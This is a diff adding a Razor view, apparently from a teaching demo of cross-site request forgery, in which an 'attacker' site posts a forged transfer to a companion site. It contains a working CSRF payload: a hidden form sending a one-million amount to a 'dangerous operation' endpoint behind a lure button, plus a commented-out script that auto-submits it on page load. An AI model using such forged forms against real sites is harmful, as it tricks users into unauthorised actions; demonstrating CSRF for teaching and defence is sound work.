@@ -1,0 +1,25 @@
+﻿@using WebSiteDevil.Configuration
+@model WebSitesSettings
+@{
+    ViewData["Title"] = "Demo03";
+}
+
+<h1>Demo03</h1>
+
+<form action="@($"{Model.AngelUri}/Csrf/Demo/SomeDangerOperationPost")" method="post">
+    <input type="hidden" name="Person" value="Mr. Hacker">
+    <input type="hidden" name="Amount" value="1000000">
+    <button type="submit">Click me to get a big bonus</button>
+</form>
+
+
+@*
+    @section Scripts
+            {
+        <script type="text/javascript">
+            window.onload = function () {
+                document.forms[0].submit();
+            };
+        </script>
+    }
+*@
